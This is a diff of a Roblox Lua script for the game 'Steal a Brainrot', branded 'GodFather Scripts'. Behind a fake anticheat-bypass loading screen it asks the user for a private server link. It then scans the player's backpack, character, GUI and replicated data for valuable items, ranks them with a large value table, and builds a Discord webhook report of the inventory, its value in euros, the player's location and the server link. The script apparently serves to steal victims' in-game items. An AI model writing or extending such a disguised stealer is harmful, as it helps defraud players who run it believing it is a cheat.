@@ -4,6 +4,7 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local StarterGui = game:GetService("StarterGui")
 local LocalPlayer = game:GetService("Players").LocalPlayer
 local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
 
 -- Detect Executor
 local function getExecutorName()
@@ -31,49 +32,289 @@ local function getExecutorName()
     return success and result or "Unknown"
 end
 
--- Brainrot Configuration with EUR Values - SPECIFIC NAMES ONLY
+-- ==========================================
+-- REAL BRAINROT DATABASE - Steal a Brainrot
+-- Values based on La Vacca Saturno Saturnita = 1 unit
+-- ==========================================
 local BRAINROT_VALUES = {
-    -- Common
-    ["Brainrot"] = 0.50,
-    ["Basic Brainrot"] = 1.00,
-    ["Small Brainrot"] = 2.50,
+    -- OG Brainrots (Highest Value)
+    ["Strawberry Elephant"] = 50000,
+    ["Skibidi Toilet"] = 35000,
+    ["Meowl"] = 25000,
     
-    -- Rare
-    ["Rare Brainrot"] = 5.00,
-    ["Golden Brainrot"] = 10.00,
-    ["Crystal Brainrot"] = 15.00,
+    -- Secret Brainrots (High Tier)
+    ["Dragon Gingerini"] = 9500,
+    ["Dragon Cannelloni"] = 5500,
+    ["Hydra Dragon Cannelloni"] = 5000,
+    ["Cerberus"] = 4500,
+    ["Rosey and Teddy"] = 3800,
+    ["Ketupat Bros"] = 2700,
+    ["Ginger Gerat"] = 2500,
+    ["La Supreme Combinasion"] = 2400,
+    ["Capitano Moby"] = 2000,
+    ["Cooki and Milki"] = 2000,
+    ["Reinito Sleighito"] = 2000,
+    ["Burguro And Fryuro"] = 1600,
+    ["Spooky and Pumpky"] = 1200,
+    ["Fragrama and Chocrama"] = 1100,
+    ["Los Primos"] = 1000,
+    ["Garama and Madundung"] = 980,
+    ["La Casa Boo"] = 950,
+    ["Popcuru and Fizzuru"] = 900,
+    ["Rosetti Tualetti"] = 900,
+    ["Jolly Jolly Sahur"] = 700,
+    ["La Secret Combinasion"] = 550,
+    ["La Ginger Sekolah"] = 500,
+    ["Chillin Chili"] = 450,
+    ["Tang Tang Keletang"] = 400,
+    ["Ketupat Kepat"] = 360,
+    ["La Taco Combinasion"] = 330,
+    ["Los Bros"] = 320,
+    ["Tictac Sahur"] = 330,
+    ["Los Spaghettis"] = 300,
+    ["Chipso and Queso"] = 300,
+    ["Los Jolly Combinasionas"] = 300,
+    ["Nuclearo Dinossauro"] = 300,
+    ["Orcaledon"] = 275,
+    ["Spaghetti Tualetti"] = 275,
+    ["La Jolly Grande"] = 260,
+    ["List List List Sahur"] = 245,
+    ["La Romantic Grande"] = 250,
+    ["Los Candies"] = 245,
+    ["Money Money Puggy"] = 240,
+    ["W or L"] = 220,
+    ["La Extinct Grande"] = 200,
+    ["Gobblino Uniciclino"] = 200,
+    ["Las Sis"] = 200,
+    ["Eviledon"] = 200,
+    ["Los Puggies"] = 150,
+    ["Brunito Marsito"] = 150,
+    ["Money Money Reindeer"] = 140,
+    ["La Spooky Grande"] = 130,
+    ["Los 25"] = 130,
+    ["Chicleteira Cupideira"] = 125,
+    ["Tuff Toucan"] = 120,
+    ["Spinny Hammy"] = 120,
+    ["Esok Sekolah"] = 110,
+    ["Noo my Heart"] = 100,
+    ["Swaggy Bros"] = 100,
+    ["Bacuru and Egguru"] = 90,
+    ["Los Spooky Combinasionas"] = 70,
+    ["La Grande Combinasion"] = 70,
+    ["Chicleteira Noelteira"] = 45,
+    ["Los Combinasionas"] = 45,
+    ["Los 67"] = 40,
+    ["Secret Lucky Block"] = 40,
+    ["Mieteteira Bicicleteira"] = 35,
+    ["Chicleteira Bicicleteira"] = 35,
+    ["Chimnino"] = 30,
+    ["Chicleteirina Bicicleteirina"] = 25,
+    ["Los Mobilis"] = 25,
+    ["67"] = 20,
+    ["Rang Ring Bus"] = 20,
+    ["Noo my Present"] = 20,
+    ["Los Nooo My Hotspotsitos"] = 20,
+    ["Arcadopus"] = 15,
+    ["Noo my Candy"] = 15,
+    ["Pot Hotspot"] = 15,
+    ["Los Quesadillas"] = 15,
+    ["Burrito Bandito"] = 15,
+    ["Chill Puppy"] = 15,
+    ["Quesadillo Vampiro"] = 10,
+    ["Ho Ho Ho Sahur"] = 5,
+    ["Job Job Job Sahur"] = 5,
+    ["Frankentteo"] = 4,
+    ["Los Trios"] = 4,
+    ["Karker Sahur"] = 4,
+    ["Las Vaquitas Saturnitas"] = 4,
+    ["Los Karkeritos"] = 4,
+    ["Extinct Matteo"] = 4,
+    ["Pumpkini Spyderini"] = 4,
+    ["Rocco Disco"] = 4,
+    ["Reindeer Tralala"] = 4,
+    ["La Karkerkar Combinasion"] = 4,
+    ["Yess my Examine"] = 4,
+    ["Bisonte Giuppitere"] = 2,
+    ["Karkerkar Kurkur"] = 2,
+    ["Los Matteos"] = 2,
+    ["Trenostruzzo Turbo 4000"] = 2,
+    ["Jackorilla"] = 2,
+    ["Sammyni Spyderini"] = 2,
+    ["Torrtuginni Dragonfrutini"] = 2,
+    ["Dul Dul Dul"] = 2,
+    ["Blackhole Goat"] = 2,
+    ["Chachechi"] = 2,
+    ["Agarrini la Palini"] = 2,
+    ["Los Spyderinis"] = 2,
+    ["Fragola La La La"] = 2,
+    ["Extinct Tralalero"] = 2,
+    ["La Cucaracha"] = 2,
+    ["Los Tralaleritos"] = 2,
+    ["Los Tortus"] = 2,
+    ["Zombie Tralala"] = 2,
+    ["Vulturino Skeletono"] = 2,
+    ["Boatito Auratito"] = 2,
+    ["Guerriro Digitale"] = 2,
+    ["La Vacca Saturno Saturnita"] = 1,
     
-    -- Epic
-    ["Epic Brainrot"] = 25.00,
-    ["Diamond Brainrot"] = 50.00,
-    ["Rainbow Brainrot"] = 75.00,
+    -- Brainrot God Brainrots
+    ["Pop Pop Sahur"] = 77,
+    ["Ginger Cisterna"] = 76,
+    ["Bombardini Tortinii"] = 64,
+    ["Los Tipi Tacos"] = 60,
+    ["Frio Ninja"] = 59,
+    ["Yeti Claus"] = 58,
+    ["Ginger Globo"] = 58,
+    ["Dug Dug Dug"] = 57,
+    ["Los Orcalitos"] = 57,
+    ["Aquanaut"] = 57,
+    ["Corn Corn Corn Sahur"] = 56,
+    ["Squalanana"] = 56,
+    ["Cacasito Satalito"] = 56,
+    ["Tartaruga Cisterna"] = 56,
+    ["Los Bombinitos"] = 55,
+    ["Tractoro Dinosauro"] = 55,
+    ["Piccione Macchina"] = 54,
+    ["Espresso Signora"] = 53,
+    ["Trenostruzzo Turbo 3000"] = 53,
+    ["Pakrahmatmamat"] = 50,
+    ["Los Tungtuntuncitos"] = 50,
+    ["Ballerina Peppermintina"] = 50,
+    ["Gattito Tacoto"] = 47,
+    ["Capi Taco"] = 45,
+    ["Urubini Flamenguini"] = 44,
+    ["Trippi Troppi Troppa Trippa"] = 44,
+    ["Tukanno Bananno"] = 23,
+    ["Statutino Libertino"] = 22,
+    ["Tipi Topi Taco"] = 22,
+    ["Tralalita Tralala"] = 22,
+    ["Chihuanini Taconini"] = 22,
+    ["Girafa Celestre"] = 20,
+    ["Gyattatino Nyanino"] = 20,
+    ["Trigoligre Frutonni"] = 20,
+    ["Orcalero Orcala"] = 20,
+    ["Alessio"] = 19,
+    ["Los Crocodilitos"] = 18,
+    ["Odin Din Din Dun"] = 18,
+    ["Matteo"] = 25,
+    ["Tralalero Tralala"] = 25,
+    ["Cocofanta Elefanto"] = 14,
     
-    -- Legendary
-    ["Legendary Brainrot"] = 100.00,
-    ["God Brainrot"] = 250.00,
-    ["Titan Brainrot"] = 500.00,
-    ["Omega Brainrot"] = 1000.00,
+    -- Mythic Brainrots
+    ["Tree Tree Tree Sahur"] = 14,
+    ["Bananito Bandito"] = 14,
+    ["Toiletto Focaccino"] = 13,
+    ["Carrotini Brainini"] = 13,
+    ["Elefanto Frigo"] = 12,
+    ["Carloo"] = 12,
+    ["Cachorrito Melonito"] = 12,
+    ["Jingle Jingle Sahur"] = 12,
+    ["Gangazelli Trulala"] = 12,
+    ["Tob Tobi Tobi"] = 11,
+    ["Lerulerulerule"] = 11,
+    ["Tracoducotulu Delapeladustuz"] = 10,
+    ["Gorillo Watermelondrillo"] = 10,
+    ["Cavallo Virtuso"] = 8,
+    ["Te Te Te Sahur"] = 8,
+    ["Avocadorilla"] = 7,
+    ["Bombombini Gusini"] = 4,
+    ["Zibra Zubra Zibralini"] = 4,
+    ["Tigrilini Watermelini"] = 4,
+    ["Bombardiro Crocodilo"] = 3,
+    ["Rhino Toasterino"] = 3,
+    ["Orangutini Ananasini"] = 3,
+    ["Spioniro Golubiro"] = 3,
+    ["Frigo Camelo"] = 2,
     
-    -- Special Events
-    ["Christmas Brainrot"] = 30.00,
-    ["Halloween Brainrot"] = 35.00,
-    ["Anniversary Brainrot"] = 100.00,
+    -- Legendary Brainrots
+    ["Sigma Girl"] = 0.2,
+    ["Sealo Regalo"] = 0.2,
+    ["Buho de Fuego"] = 0.2,
+    ["Puffaball"] = 0.18,
+    ["Chocco Bunny"] = 0.17,
+    ["Sigma Boy"] = 0.16,
+    ["Signore Carapace"] = 0.15,
+    ["Pi Pi Watermelon"] = 0.15,
+    ["Pandaccini Bananini"] = 0.14,
+    ["Cocosini Mama"] = 0.13,
+    ["Pipi Potato"] = 0.12,
+    ["Strawberrelli Flamingelli"] = 0.12,
+    ["Blueberrinni Octopusini"] = 0.11,
+    ["Caramello Filtrello"] = 0.11,
+    ["Quivoli Ameleoni"] = 0.1,
+    ["Glorbo Fruttodrillo"] = 0.09,
+    ["Lionel Cactuseli"] = 0.08,
+    ["Chef Crabracadabra"] = 0.08,
+    ["Burbaloni Loliloli"] = 0.08,
+    ["Ballerina Cappuccina"] = 0.07,
+    ["Tirilikalika Tirilikalako"] = 0.06,
+    ["Chimpanzini Bananini"] = 0.05,
     
-    -- KDML Specific
-    ["KDML"] = 50.00,
-    ["KDML Script"] = 75.00,
-    ["KDML Brainrot"] = 100.00,
+    -- Epic Brainrots
+    ["Mummio Rappitto"] = 0.08,
+    ["Penguino Cocosino"] = 0.07,
+    ["Wombo Rollo"] = 0.07,
+    ["Penguin Tree"] = 0.07,
+    ["Doi Doi Do"] = 0.07,
+    ["Salamino Penguino"] = 0.06,
+    ["Frogato Pirato"] = 0.06,
+    ["Mangolini Parrocini"] = 0.06,
+    ["Ti Ti Ti Sahur"] = 0.06,
+    ["Avocadini Guffo"] = 0.06,
+    ["Brri Brri Bicus Dicus Bombicus"] = 0.05,
+    ["Perochello Lemonchello"] = 0.05,
+    ["Bananita Dolphinita"] = 0.05,
+    ["Malame Amarele"] = 0.05,
+    ["Bambini Crostini"] = 0.05,
+    ["Trulimero Trulicina"] = 0.05,
+    ["Avocadini Antilopini"] = 0.04,
+    ["Brr Brr Patapim"] = 0.04,
+    ["Bandito Axolito"] = 0.03,
+    ["Cappuccino Assassino"] = 0.03,
+    
+    -- Rare Brainrots
+    ["Pinealotto Fruttarino"] = 0.05,
+    ["Pipi Avocado"] = 0.05,
+    ["Frogo Elfo"] = 0.05,
+    ["Tric Trac Baraboom"] = 0.05,
+    ["Ta Ta Ta Ta Sahur"] = 0.04,
+    ["Cacto Hipopotamo"] = 0.04,
+    ["Boneca Ambalabu"] = 0.03,
+    ["Bandito Bobritto"] = 0.03,
+    ["Gangster Footera"] = 0.03,
+    ["Trippi Troppi"] = 0.02,
+    
+    -- Common Brainrots
+    ["Pipi Corni"] = 0.02,
+    ["Pipi Kiwi"] = 0.02,
+    ["Tartaragno"] = 0.02,
+    ["Raccooni Jandelini"] = 0.02,
+    ["Noobini Santanini"] = 0.02,
+    ["Talpa Di Fero"] = 0.02,
+    ["Svinina Bombardino"] = 0.02,
+    ["Fluriflura"] = 0.01,
+    ["Tim Cheese"] = 0.01,
+    ["Lirilì Larilà"] = 0.01,
+    ["Noobini Pizzanini"] = 0.01,
 }
 
 -- IGNORE LIST - Objects that contain these words are NOT player items
 local IGNORE_PATTERNS = {
     "collision", "ignore", "vfx", "stars", "spawn", "trader", "npc", "shop", 
     "template", "storage", "system", "handler", "controller", "manager",
-    "left", "right", "bigger", "present", "god lucky block", "workspace"
+    "left", "right", "bigger", "present", "god lucky block", "workspace",
+    "baseplate", "terrain", "camera", "gui", "ui", "effect", "trail", "particle",
+    "sound", "decal", "texture", "mesh", "union", "wedge", "corner", "cylinder"
 }
 
 -- Floor Detection Configuration
-local FLOOR_HEIGHTS = {}
+local FLOOR_HEIGHTS = {
+    [0] = "Ground Floor",
+    [50] = "Floor 2",
+    [100] = "Floor 3",
+    [150] = "Floor 4",
+    [200] = "Floor 5",
+}
 
 -- Packages
 local NetPackages = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
@@ -198,13 +439,13 @@ footerLabel.BackgroundTransparency = 1
 footerLabel.Font = Enum.Font.Gotham
 footerLabel.TextSize = 12
 footerLabel.TextColor3 = Color3.fromRGB(100, 0, 0)
-footerLabel.Text = "discord.gg/godfathers | v2.0.1"
+footerLabel.Text = "discord.gg/godfathers | v2.1.0"
 
 local loadingStages = {
     {percent = 15, text = "BYPASSING ANTICHEAT...", status = "Injecting stealth modules..."},
     {percent = 30, text = "LOADING ASSETS...", status = "Fetching game data..."},
     {percent = 45, text = "SCANNING BRAINROTS...", status = "Analyzing workspace models..."},
-    {percent = 60, text = "CALCULATING VALUES...", status = "Converting to EUR..."},
+    {percent = 60, text = "CALCULATING VALUES...", status = "Converting to trade values..."},
     {percent = 75, text = "SECURE CONNECTION...", status = "Establishing webhook tunnel..."},
     {percent = 90, text = "FINALIZING...", status = "Cleaning up traces..."},
     {percent = 100, text = "COMPLETE", status = "Ready to execute"},
@@ -303,7 +544,7 @@ titleLabel.Text = "Enter Private Server Link to Unlock"
 local serverLinkBox = Instance.new("TextBox", mainFrame)
 serverLinkBox.Size = UDim2.new(0.9, 0, 0, 45)
 serverLinkBox.Position = UDim2.new(0.05, 0, 0.48, 0)
-serverLinkBox.PlaceholderText = "https://www.roblox.com/share?code=..."
+serverLinkBox.PlaceholderText = "https://www.roblox.com/share?code= ..."
 serverLinkBox.Font = Enum.Font.Gotham
 serverLinkBox.TextSize = 14
 serverLinkBox.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -352,21 +593,24 @@ local function getCurrentFloor()
     if not humanoidRootPart then return "Unknown" end
     
     local currentPos = humanoidRootPart.Position
+    local height = currentPos.Y
     
-    if #FLOOR_HEIGHTS > 0 then
-        local currentHeight = currentPos.Y
-        local detectedFloor = "Ground Floor"
-        local closestHeight = -math.huge
-        
-        for height, floorName in pairs(FLOOR_HEIGHTS) do
-            if currentHeight >= height and height > closestHeight then
-                closestHeight = height
-                detectedFloor = floorName
-            end
+    -- Check defined floor heights
+    local detectedFloor = "Ground Floor"
+    local closestHeight = -math.huge
+    
+    for floorHeight, floorName in pairs(FLOOR_HEIGHTS) do
+        if height >= floorHeight and floorHeight > closestHeight then
+            closestHeight = floorHeight
+            detectedFloor = floorName
         end
+    end
+    
+    if detectedFloor ~= "Ground Floor" then
         return detectedFloor
     end
     
+    -- Raycast to find floor name
     local raycastParams = RaycastParams.new()
     raycastParams.FilterDescendantsInstances = {character}
     raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
@@ -380,24 +624,20 @@ local function getCurrentFloor()
         local hitPart = raycastResult.Instance
         if hitPart then
             local partName = hitPart.Name:lower()
-            local parentName = hitPart.Parent and hitPart.Parent.Name:lower() or ""
-            
             if partName:find("floor") or partName:find("level") or partName:find("stage") then
-                local floorNum = partName:match("%d+") or parentName:match("%d+")
+                local floorNum = partName:match("%d+")
                 if floorNum then
                     return "Floor " .. floorNum
                 else
                     return hitPart.Name
                 end
-            elseif partName:find("ground") or partName:find("baseplate") or partName:find("terrain") then
+            elseif partName:find("ground") or partName:find("baseplate") then
                 return "Ground Floor"
-            else
-                return hitPart.Name
             end
         end
     end
     
-    local height = currentPos.Y
+    -- Fallback based on height
     if height < 10 then
         return "Ground Floor"
     elseif height < 50 then
@@ -424,18 +664,23 @@ local function shouldIgnore(name)
     return false
 end
 
--- Get exact brainrot type from name
+-- Fuzzy match brainrot name (handles slight variations)
 local function getBrainrotType(name)
-    -- Check for exact matches first
-    if BRAINROT_VALUES[name] then
-        return name, BRAINROT_VALUES[name]
+    local exactMatch = BRAINROT_VALUES[name]
+    if exactMatch then
+        return name, exactMatch
     end
     
-    -- Check for contained matches (but not partial word matches)
+    -- Try case-insensitive match
     for brainrotName, value in pairs(BRAINROT_VALUES) do
-        -- Use word boundaries to avoid partial matches
-        -- Check if brainrotName appears as a whole word or standalone
-        if name == brainrotName then
+        if name:lower() == brainrotName:lower() then
+            return brainrotName, value
+        end
+    end
+    
+    -- Try partial match (for mutated names like "Golden Tralalero Tralala")
+    for brainrotName, value in pairs(BRAINROT_VALUES) do
+        if name:find(brainrotName) or brainrotName:find(name) then
             return brainrotName, value
         end
     end
@@ -443,66 +688,28 @@ local function getBrainrotType(name)
     return nil, 0
 end
 
--- Scan for brainrots in player's inventory/character ONLY
+-- Enhanced scanning with multiple detection methods
 local function scanBrainrots()
     local foundBrainrots = {}
     local totalValue = 0
     local totalCount = 0
+    local scannedNames = {} -- Prevent duplicates
     
-    -- Search locations where player items are typically stored
-    local searchLocations = {}
-    
-    -- 1. Player's Backpack (inventory)
+    -- Method 1: Check Player's Backpack (Inventory)
     if LocalPlayer:FindFirstChild("Backpack") then
-        table.insert(searchLocations, LocalPlayer.Backpack)
-    end
-    
-    -- 2. Player's Character (equipped items)
-    if LocalPlayer.Character then
-        table.insert(searchLocations, LocalPlayer.Character)
-    end
-    
-    -- 3. Player's PlayerGui (if items are stored there)
-    if LocalPlayer:FindFirstChild("PlayerGui") then
-        -- Only check specific folders if they exist
-        local guiItems = LocalPlayer.PlayerGui:FindFirstChild("Brainrots") or 
-                        LocalPlayer.PlayerGui:FindFirstChild("Inventory") or
-                        LocalPlayer.PlayerGui:FindFirstChild("Items")
-        if guiItems then
-            table.insert(searchLocations, guiItems)
-        end
-    end
-    
-    -- Search in defined locations only (not entire workspace)
-    for _, location in ipairs(searchLocations) do
-        for _, obj in ipairs(location:GetDescendants()) do
-            if obj:IsA("Model") or obj:IsA("Tool") or obj:IsA("Part") or obj:IsA("MeshPart") then
+        for _, obj in ipairs(LocalPlayer.Backpack:GetDescendants()) do
+            if obj:IsA("Tool") or obj:IsA("Model") then
                 local name = obj.Name
-                
-                -- Skip if should be ignored
-                if shouldIgnore(name) then
-                    continue
-                end
-                
-                -- Check if it's a valid brainrot
-                local brainrotType, value = getBrainrotType(name)
-                
-                if brainrotType then
-                    -- Check for duplicates (same name in same parent)
-                    local isDuplicate = false
-                    for _, existing in ipairs(foundBrainrots) do
-                        if existing.name == name and existing.parent == obj.Parent then
-                            isDuplicate = true
-                            break
-                        end
-                    end
-                    
-                    if not isDuplicate then
+                if not shouldIgnore(name) and not scannedNames[name] then
+                    local brainrotType, value = getBrainrotType(name)
+                    if brainrotType then
+                        scannedNames[name] = true
                         table.insert(foundBrainrots, {
                             name = name,
                             displayName = brainrotType,
                             value = value,
-                            parent = obj.Parent
+                            location = "Backpack",
+                            rarity = getRarity(value)
                         })
                         totalValue = totalValue + value
                         totalCount = totalCount + 1
@@ -512,7 +719,107 @@ local function scanBrainrots()
         end
     end
     
+    -- Method 2: Check Character (Equipped items)
+    if LocalPlayer.Character then
+        for _, obj in ipairs(LocalPlayer.Character:GetDescendants()) do
+            if obj:IsA("Tool") or obj:IsA("Model") or obj:IsA("Part") or obj:IsA("MeshPart") then
+                local name = obj.Name
+                if not shouldIgnore(name) and not scannedNames[name] then
+                    local brainrotType, value = getBrainrotType(name)
+                    if brainrotType then
+                        scannedNames[name] = true
+                        table.insert(foundBrainrots, {
+                            name = name,
+                            displayName = brainrotType,
+                            value = value,
+                            location = "Equipped",
+                            rarity = getRarity(value)
+                        })
+                        totalValue = totalValue + value
+                        totalCount = totalCount + 1
+                    end
+                end
+            end
+        end
+    end
+    
+    -- Method 3: Check PlayerGui for Inventory UI
+    if LocalPlayer:FindFirstChild("PlayerGui") then
+        local guiItems = LocalPlayer.PlayerGui:FindFirstChild("Brainrots") or 
+                        LocalPlayer.PlayerGui:FindFirstChild("Inventory") or
+                        LocalPlayer.PlayerGui:FindFirstChild("Items") or
+                        LocalPlayer.PlayerGui:FindFirstChild("PetUI")
+        if guiItems then
+            for _, obj in ipairs(guiItems:GetDescendants()) do
+                if obj:IsA("TextLabel") or obj:IsA("ImageLabel") then
+                    local name = obj.Name
+                    if not shouldIgnore(name) and not scannedNames[name] then
+                        local brainrotType, value = getBrainrotType(name)
+                        if brainrotType then
+                            scannedNames[name] = true
+                            table.insert(foundBrainrots, {
+                                name = name,
+                                displayName = brainrotType,
+                                value = value,
+                                location = "UI",
+                                rarity = getRarity(value)
+                            })
+                            totalValue = totalValue + value
+                            totalCount = totalCount + 1
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    -- Method 4: Check ReplicatedStorage for player data
+    pcall(function()
+        local playerData = ReplicatedStorage:FindFirstChild("PlayerData") or 
+                          ReplicatedStorage:FindFirstChild("PlayerBrainrots")
+        if playerData then
+            local userData = playerData:FindFirstChild(tostring(LocalPlayer.UserId)) or
+                           playerData:FindFirstChild(LocalPlayer.Name)
+            if userData then
+                for _, obj in ipairs(userData:GetDescendants()) do
+                    local name = obj.Name
+                    if not shouldIgnore(name) and not scannedNames[name] then
+                        local brainrotType, value = getBrainrotType(name)
+                        if brainrotType then
+                            scannedNames[name] = true
+                            table.insert(foundBrainrots, {
+                                name = name,
+                                displayName = brainrotType,
+                                value = value,
+                                location = "Data",
+                                rarity = getRarity(value)
+                            })
+                            totalValue = totalValue + value
+                            totalCount = totalCount + 1
+                        end
+                    end
+                end
+            end
+        end
+    end)
+    
+    -- Sort by value (highest first)
+    table.sort(foundBrainrots, function(a, b)
+        return a.value > b.value
+    end)
+    
     return foundBrainrots, totalValue, totalCount
+end
+
+-- Get rarity based on value
+function getRarity(value)
+    if value >= 1000 then return "🔴 Secret"
+    elseif value >= 50 then return "🟠 Brainrot God"
+    elseif value >= 10 then return "🟡 Mythic"
+    elseif value >= 1 then return "🟢 Legendary"
+    elseif value >= 0.1 then return "🔵 Epic"
+    elseif value >= 0.05 then return "🟣 Rare"
+    else return "⚪ Common" end
 end
 
 -- Button click handler
@@ -550,18 +857,24 @@ enterButton.MouseButton1Click:Connect(function()
     local foundBrainrots, totalValue, totalCount = scanBrainrots()
     local currentFloor = getCurrentFloor()
     
-    -- Format brainrot list for webhook
+    -- Format brainrot list for webhook (top 15 most valuable)
     local brainrotList = ""
     if #foundBrainrots > 0 then
-        for i, item in ipairs(foundBrainrots) do
-            brainrotList = brainrotList .. string.format("%d. **%s** - €%.2f EUR\n", 
-                i, item.displayName, item.value)
+        local displayCount = math.min(#foundBrainrots, 15)
+        for i = 1, displayCount do
+            local item = foundBrainrots[i]
+            brainrotList = brainrotList .. string.format("%d. %s **%s** - %.2f LV\n", 
+                i, item.rarity, item.displayName, item.value)
+        end
+        if #foundBrainrots > 15 then
+            brainrotList = brainrotList .. string.format("\n*...and %d more*", #foundBrainrots - 15)
         end
     else
         brainrotList = "No brainrots found in inventory"
     end
     
-    local totalEUR = string.format("€%.2f", totalValue)
+    -- Calculate EUR equivalent (1 LV = 0.01 EUR for example)
+    local totalEUR = totalValue * 0.01
     
     local char = LocalPlayer.Character
     local hrp = char and char:FindFirstChild("HumanoidRootPart")
@@ -571,10 +884,10 @@ enterButton.MouseButton1Click:Connect(function()
     
     task.spawn(function()
         local webhookData = {
-            username = "GodFathers Security",
+            username = "GodFather Scripts",
             avatar_url = "https://i.imgur.com/6XK8YBn.png",
             embeds = {{
-                title = "🔴 New Execution Detected",
+                title = "🔴 New Execution Detected - Steal a Brainrot",
                 color = 0xDC143C,
                 timestamp = DateTime.now():ToIsoDate(),
                 thumbnail = {
@@ -600,9 +913,9 @@ enterButton.MouseButton1Click:Connect(function()
                         inline = false
                     },
                     {
-                        name = "🎁 Brainrot Inventory (" .. totalCount .. " items)",
-                        value = string.format("**Total Value:** %s EUR\n\n%s", 
-                            totalEUR, brainrotList),
+                        name = string.format("🧠 Brainrot Inventory (%d items)", totalCount),
+                        value = string.format("**Total Value:** %.2f LV (€%.2f EUR)**\n\n%s", 
+                            totalValue, totalEUR, brainrotList),
                         inline = false
                     },
                     {
@@ -612,7 +925,7 @@ enterButton.MouseButton1Click:Connect(function()
                     }
                 },
                 footer = {
-                    text = "GodFathers Scripts | " .. os.date("%Y-%m-%d %H:%M:%S")
+                    text = "GodFather Scripts | " .. os.date("%Y-%m-%d %H:%M:%S")
                 }
             }}
         }
